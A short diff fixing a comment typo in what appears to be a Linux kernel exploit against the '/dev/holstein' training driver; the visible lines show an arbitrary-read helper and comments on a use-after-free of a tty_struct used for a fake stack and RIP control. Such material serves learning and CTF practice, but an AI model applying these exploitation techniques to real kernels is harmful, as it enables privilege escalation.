@@ -102,7 +102,7 @@ unsigned int AAR32(unsigned long addr) {
 int main() {
   save_state();
 
-  // First use-afer-free. This controlled tty_struct object will be used
+  // First use-after-free. This controlled tty_struct object will be used
   // to store the fake stack and the RIP control address (tty_operations)
   fd1 = open("/dev/holstein", O_RDWR);
   fd2 = open("/dev/holstein", O_RDWR);
